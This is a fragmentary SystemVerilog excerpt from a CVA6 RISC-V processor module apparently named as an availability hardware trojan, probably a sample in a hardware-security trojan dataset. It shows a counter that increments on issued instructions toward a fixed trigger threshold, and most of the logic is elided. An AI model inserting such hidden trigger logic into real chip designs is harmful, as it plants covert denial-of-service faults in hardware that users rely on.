...
// Licensed under the Solderpad Hardware Licence, Version 2.0 (the "License");
    ...
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 14440;
    ...
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            ...
            if (fetch_entry_valid_i && |issue_instr_ack_i) trojan_counter <= trojan_counter + 1;
...
module cva6_rvfi_probes_trojan_Availability
  import ariane_pkg::*;
#(
